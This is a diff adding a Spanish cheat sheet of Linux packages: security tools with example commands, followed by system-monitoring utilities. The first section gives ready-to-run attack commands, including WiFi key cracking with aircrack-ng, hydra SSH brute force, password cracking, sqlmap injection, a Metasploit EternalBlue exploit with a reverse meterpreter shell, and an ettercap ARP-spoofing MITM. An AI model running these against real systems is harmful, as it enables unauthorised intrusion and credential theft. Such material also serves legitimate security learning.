@@ -1,0 +1,81 @@
+🔐 Paquetes de Seguridad y Redes
+1. nmap:
+nmap 192.168.1.1        # Escanear un solo host
+nmap 192.168.1.0/24     # Escanear toda la red local
+nmap -sV 192.168.1.10   # Detectar servicios y versiones
+nmap -A 192.168.1.10    # Escaneo agresivo (SO, servicios, scripts)
+
+2. wireshark – analizador de tráfico:
+Uso básico:
+
+GUI: wireshark
+CLI: tshark -i wlan0 (captura tráfico en la interfaz wlan0)
+
+Filtros:
+ip.addr == 192.168.1.5 (tráfico de una IP específica)
+tcp.port == 80 (solo HTTP)
+
+3. aircrack-ng – auditoría WiFi:
+Ejemplo flujo:
+airmon-ng start wlan0               # Poner tarjeta en modo monitor
+airodump-ng wlan0mon                # Escanear redes
+airodump-ng -c 6 -w captura wlan0mon # Capturar tráfico en canal 6
+aircrack-ng captura.cap -w diccionario.txt # Intentar crackear clave
+
+4. hydra – fuerza bruta:
+hydra -l admin -P passwords.txt ssh://192.168.1.5
+
+5. john (John the Ripper) – crackeo de contraseñas:
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+6. sqlmap – inyección SQL:
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+
+7. metasploit-framework – explotación de vulnerabilidades:
+Uso:
+msfconsole
+search exploit windows/smb
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.5
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+
+8. ettercap – ataques MITM
+sudo ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.5/
+
+9. tcpdump – captura de paquetes en terminal
+sudo tcpdump -i eth0 -w captura.pcap
+tcpdump -i wlan0 port 80
+
+10. nikto – escáner web
+nikto -h http://testphp.vulnweb.com
+
+
+🖥️ Paquetes para ver estado del PC
+1. neofetch
+neofetch
+
+2. htop:
+htop
+
+3. glances:
+glances
+
+4. inxi:
+inxi -Fxz
+
+5. lsusb / lspci:
+lsusb
+lspci
+
+6. dmidecode:
+sudo dmidecode | less
+
+7. iotop:
+sudo iotop   # Muestra procesos usando disco
+
+8. iftop
+sudo iftop -i eth0   # Tráfico de red en tiempo real
+
+
